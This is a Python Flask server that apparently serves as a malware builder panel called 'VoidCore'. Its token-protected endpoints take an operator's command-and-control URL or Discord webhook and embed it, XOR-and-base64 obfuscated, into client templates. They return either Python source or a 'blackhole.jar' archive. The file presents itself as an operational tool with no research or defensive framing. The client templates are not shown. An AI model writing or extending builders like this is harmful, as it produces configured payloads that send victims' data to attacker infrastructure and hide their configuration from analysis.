"""VoidCore builder backend. Owner-only (FORGE_TOKEN), ephemeral builds."""
import os, re, base64, io, zipfile
from flask import Flask, request, jsonify, send_file, abort, send_from_directory

app = Flask(__name__, static_folder="static", static_url_path="")
TOKEN = os.environ.get("FORGE_TOKEN", "")
TOKENS = set(t.strip() for t in os.environ.get("FORGE_TOKENS", "").split(",") if t.strip())
if TOKEN:
    TOKENS.add(TOKEN)

def authed():
    return request.headers.get("X-Forge-Token", "") in TOKENS and len(TOKENS) > 0

TDIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")

@app.route("/", methods=["GET"])
def index():
    return send_from_directory(app.static_folder, "index.html")

@app.errorhandler(400)
@app.errorhandler(403)
@app.errorhandler(404)
@app.errorhandler(501)
def json_err(e):
    return jsonify({"error": e.description or e.name}), e.code

def check_url(u, kind):
    if not isinstance(u, str) or len(u) > 300:
        abort(400, "bad url")
    if kind == "c2":
        if not re.match(r"^https://[A-Za-z0-9.-]{4,80}(:\d{2,5})?$", u):
            abort(400, "C2 must be https://host[:port]")
    else:
        if not re.match(r"^https://discord\.com/api/webhooks/[0-9]{5,30}/[A-Za-z0-9_-]{10,120}$", u):
            abort(400, "must be a discord.com webhook URL")
    return u

def seal_config(cfg: dict, encrypt: bool, key: bytes = None):
    """Return (config_block_py, key_note). Plaintext or XOR+base64 sealed."""
    import json as _j
    raw = _j.dumps(cfg).encode()
    if not encrypt:
        return "CONFIG = " + repr(_j.dumps(cfg)), None
    import secrets as _s
    key = key or _s.token_bytes(16)
    x = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
    kb = base64.b64encode(key).decode()
    return ("_K = base64.b64decode(\"%s\")\n"
            "_C = base64.b64decode(\"%s\")\n"
            "CONFIG = json.loads(bytes(b ^ _K[i %% len(_K)] "
            "for i, b in enumerate(_C)).decode())" % (kb, base64.b64encode(x).decode())), \
           "embedded-key (per-build random)"

@app.route("/build/py", methods=["POST"])
def build_py():
    if not authed():
        abort(403)
    data = request.get_json(force=True, silent=True) or {}
    kind = "webhook" if data.get("webhook") else "c2"
    target = check_url(data.get("webhook") or data.get("c2", ""), kind)
    encrypt = bool(data.get("encrypt", True))
    tpl = open(os.path.join(TDIR, "client_tpl.py")).read()
    cfg_block, note = seal_config({"kind": kind, "target": target}, encrypt)
    src = tpl.replace("__CONFIG_BLOCK__", cfg_block)
    return jsonify({"src": src, "encrypted": encrypt, "key_note": note,
                    "bytes": len(src)})

@app.route("/build/jar", methods=["POST"])
def build_jar():
    if not authed():
        abort(403)
    data = request.get_json(force=True, silent=True) or {}
    kind = "webhook" if data.get("webhook") else "c2"
    target = check_url(data.get("webhook") or data.get("c2", ""), kind)
    encrypt = bool(data.get("encrypt", True))
    base = os.path.join(TDIR, "template.jar")
    if not os.path.isfile(base):
        abort(501, "jar template not installed yet")
    raw_cfg = ("kind=%s\ntarget=%s\n" % (kind, target)).encode()
    if encrypt:
        k = os.urandom(16)
        x = bytes(b ^ k[i % 16] for i, b in enumerate(raw_cfg))
        cfg = b"ENC1" + k + x
    else:
        cfg = b"RAW1" + raw_cfg
    buf = io.BytesIO()
    with zipfile.ZipFile(base) as zin, zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:
        seen_cfg = False
        for item in zin.infolist():
            blob = zin.read(item.filename)
            if item.filename == "bh_config.bin":
                blob = cfg
                seen_cfg = True
            zout.writestr(item, blob)
        if not seen_cfg:
            zout.writestr("bh_config.bin", cfg)
    buf.seek(0)
    return send_file(buf, as_attachment=True, download_name="blackhole.jar",
                     mimetype="application/java-archive")

@app.route("/src", methods=["GET"])
def src_view():
    if not authed():
        abort(403)
    which = request.args.get("which", "py")
    path = os.path.join(TDIR, "client_tpl.py" if which == "py" else "PanelClient_tpl.java")
    if not os.path.isfile(path):
        abort(404)
    return jsonify({"src": open(path).read()})

if __name__ == "__main__":
    print("forge on 127.0.0.1:8899 (behind Caddy)")
    app.run(host="127.0.0.1", port=8899)
